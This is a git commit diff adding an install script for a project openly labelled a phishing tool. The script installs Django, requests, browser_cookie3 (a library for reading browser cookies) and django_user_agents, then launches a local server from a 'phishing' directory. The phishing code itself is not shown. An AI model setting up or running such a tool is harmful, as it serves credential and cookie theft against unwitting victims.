cfc50259206f2ae20a7711d5d5b11e4cbc93960d
jjmilad <104980645+jjmilad@users.noreply.github.com>
2022-05-11 19:27:35 +0300

    Add files via upload

---
+++ test/install.sh
@@ -0,0 +1,15 @@
+echo ----------phishing-tool----------
+echo "*** hello freind ***"
+echo 'install python3 and pip before using this tool'
+echo 'note !'
+echo 'change templates directory and static directory in the setting.py file'
+echo press enter to continue ...
+read continue
+
+python3 -m pip install django
+python3 -m pip install requests
+python3 -m pip install browser_cookie3
+python3 -m pip install django_user_agents
+
+cd phishing
+python3 manage.py runserver
